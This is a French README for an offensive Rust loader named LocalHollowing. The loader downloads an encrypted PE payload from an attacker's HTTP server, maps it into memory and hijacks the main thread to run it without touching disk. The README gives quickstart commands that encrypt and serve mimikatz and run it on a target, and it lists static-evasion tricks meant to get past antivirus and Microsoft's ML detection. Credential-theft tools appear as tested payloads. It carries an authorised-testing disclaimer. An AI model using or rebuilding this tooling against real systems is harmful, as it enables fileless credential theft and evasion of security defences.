# LocalHollowing

Loader offensif basé sur la technique de **Local Hollowing** en Rust. Remplace le contexte d'exécution du thread principal par un payload chiffré téléchargé en mémoire, sans créer de processus ni écrire sur disque.

> **Avertissement** : Usage exclusivement réservé à la recherche en sécurité et aux tests d'intrusion autorisés.

---

## Quickstart

```powershell
# Chiffrer un payload
python encrypt.py C:\tools\mimikatz.exe "Hollow3r!2026" -o payload

# Servir le payload
cd payload && python -m http.server 8080

# Exécuter sur la cible
.\build\mtool_rust.exe http://<IP>:8080/mimikatz.bin "Hollow3r!2026"
```

---

## Comment ça marche

```
.\build\mtool_rust.exe http://attaquant:8080/payload.bin "passphrase" [args...]
       │
       ├─ Thread secondaire créé
       │        │
       │        ├─ [1] Suspend le thread principal
       │        ├─ [2] Télécharge payload.bin (TcpStream, pas de WinHTTP)
       │        ├─ [3] Déchiffre AES-256-CBC software (clé = SHA256(passphrase))
       │        ├─ [4] Mappe le PE : headers, sections, relocations, IAT, delay imports
       │        ├─ [5] Enregistre les exception handlers (RtlAddFunctionTable)
       │        ├─ [6] Applique les protections mémoire par section
       │        ├─ [7] Spoof la command line (PEB + GetCommandLineW/A)
       │        └─ [8] Hijack RIP → entry point du payload, ResumeThread
       │
       └─ Le processus exécute le payload (fileless)
```

---

## Evasion statique

| Technique | Détail |
|---|---|
| **Rust PE** | Structure PE compilée par rustc, passe les modèles ML (Microsoft) |
| **Résolution d'API dynamique** | LoadLibraryA + GetProcAddress, noms XOR-encodés |
| **Anti constant-folding** | `read_volatile` + `#[inline(never)]` empêche rustc d'optimiser le XOR |
| **AES-256-CBC software** | Implémentation pure Rust, pas de CryptoAPI/BCrypt dans l'IAT |
| **SHA-256 software** | Dérivation de clé sans dépendance crypto externe |
| **TcpStream** | Téléchargement HTTP via `std::net`, pas de winhttp/wininet dans l'IAT |
| **Protections mémoire** | RW → RX par section, jamais de RWX |
| **Compilation directe** | `rustc -O` sans cargo, binaire minimal (~243 KB) |

---

## Build

Prérequis : **Rust** (`rustc` dans le PATH)

```powershell
.\build_rust.ps1
# ou directement :
rustc rust_loader/src/main.rs -O --edition 2021 -o build/mtool_rust.exe
```

---

## Structure

```
local-hollowing/
├── build_rust.ps1           # Script de build
├── encrypt.py               # Payload encryptor (AES-256-CBC)
├── rust_loader/
│   └── src/
│       └── main.rs          # Source complète (download, decrypt, RunPE)
├── scripts/
│   └── vt_scan.py           # Scan VirusTotal automatisé
└── build/
    └── mtool_rust.exe       # Binaire compilé (~243 KB)
```

---

## Payloads testés

| Payload | Status |
|---|---|
| mimikatz | OK |
| CoercedPotato | OK |
| WSASS | OK |
| chromelevator | OK |
| JuicyPotato | FAIL (ACCESS_VIOLATION, binaire 2018 incompatible) |

---

## Limitations

- Payloads **.NET** non supportés (utiliser le CLR loader)
- **x64 uniquement**
- Certains vieux binaires (JuicyPotato 2018) crashent à cause d'incompatibilités CRT
- Payloads sans relocation table (`/FIXED`) peuvent échouer

---

## Requirements

- **Rust** (`rustc` dans le PATH) pour la compilation
- **Python 3** + `pycryptodome` (`pip install pycryptodome`) pour le chiffrement

---

## Licence

Recherche et éducation en sécurité offensive uniquement. **Usage réservé aux environnements autorisés.**
